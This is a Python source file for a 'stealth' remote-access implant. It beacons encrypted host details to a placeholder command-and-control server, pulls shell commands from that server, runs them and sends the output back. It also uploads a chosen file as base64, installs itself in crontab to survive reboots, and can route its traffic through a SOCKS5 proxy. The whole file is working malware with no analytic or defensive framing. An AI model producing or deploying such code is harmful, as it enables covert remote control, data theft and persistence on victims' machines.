#!/usr/bin/env python3
import os
import time
import requests
import socket
import subprocess
import base64
import argparse
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# === CONFIGURATION ===
C2_URL = "https://your-c2-server.com/beacon"
ENCRYPTION_KEY = b'ThisIsA16ByteKey'  # 16-byte AES key
KILL_SWITCH_FILE = "/tmp/redot_kill"

# === ARGUMENT PARSING ===
parser = argparse.ArgumentParser(description="Stealth Callback Agent")
parser.add_argument('--proxy', help='SOCKS5 proxy (e.g., socks5h://127.0.0.1:9050)')
parser.add_argument('--persist', action='store_true', help='Enable persistence (crontab)')
parser.add_argument('--exfil', help='File to exfiltrate')
parser.add_argument('--interval', type=int, default=30, help='Beacon interval (seconds)')
args = parser.parse_args()

session = requests.Session()
if args.proxy:
    session.proxies.update({
        'http': args.proxy,
        'https': args.proxy
    })

# === AES ENCRYPTION ===
def encrypt_payload(data):
    cipher = AES.new(ENCRYPTION_KEY, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data.encode())
    return base64.b64encode(cipher.nonce + tag + ciphertext).decode()

# === PERSISTENCE (crontab) ===
def enable_persistence():
    path = os.path.abspath(__file__)
    cron_line = f"@reboot python3 {path} --interval {args.interval} &\n"
    cron_cmd = f'(crontab -l 2>/dev/null; echo "{cron_line}") | crontab -'
    os.system(cron_cmd)
    print("[*] Persistence added via crontab.")

# === FILE EXFIL ===
def exfiltrate_file(filepath):
    try:
        with open(filepath, 'rb') as f:
            content = base64.b64encode(f.read()).decode()
        payload = {
            "agent": socket.gethostname(),
            "type": "exfil",
            "filename": os.path.basename(filepath),
            "content": content
        }
        session.post(C2_URL, json=payload, timeout=10)
        print(f"[+] File {filepath} exfiltrated.")
    except Exception as e:
        print(f"[!] Exfiltration failed: {e}")

# === KILL SWITCH ===
def check_kill_switch():
    return os.path.exists(KILL_SWITCH_FILE)

# === REMOTE COMMAND EXECUTION ===
def get_command():
    try:
        r = session.get(C2_URL + "/cmd", timeout=10)
        if r.status_code == 200 and r.text.strip():
            return r.text.strip()
    except:
        return None

def run_command(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return output.decode()
    except Exception as e:
        return str(e)

# === DASHBOARD LOGGING ===
def dashboard_log(message):
    log_file = "loot/dashboard/agents.log"
    os.makedirs(os.path.dirname(log_file), exist_ok=True)
    with open(log_file, "a") as f:
        f.write(f"[{datetime.now()}] {message}\n")

# === MAIN LOOP ===
if args.persist:
    enable_persistence()

if args.exfil:
    exfiltrate_file(args.exfil)

print("[*] Stealth agent active.")

while True:
    if check_kill_switch():
        print("[!] Kill switch detected. Exiting.")
        dashboard_log("Agent killed by switch.")
        break

    hostname = socket.gethostname()
    ip = socket.gethostbyname(socket.gethostname())
    beacon = f"{hostname}::{ip}::{datetime.now().isoformat()}"
    encrypted_beacon = encrypt_payload(beacon)

    try:
        r = session.post(C2_URL, data={"beacon": encrypted_beacon}, timeout=10)
        dashboard_log(f"Beacon sent from {hostname} ({ip})")
    except Exception as e:
        dashboard_log(f"Beacon error: {e}")

    cmd = get_command()
    if cmd:
        output = run_command(cmd)
        session.post(C2_URL, data={"agent": hostname, "output": encrypt_payload(output)})

    time.sleep(args.interval)
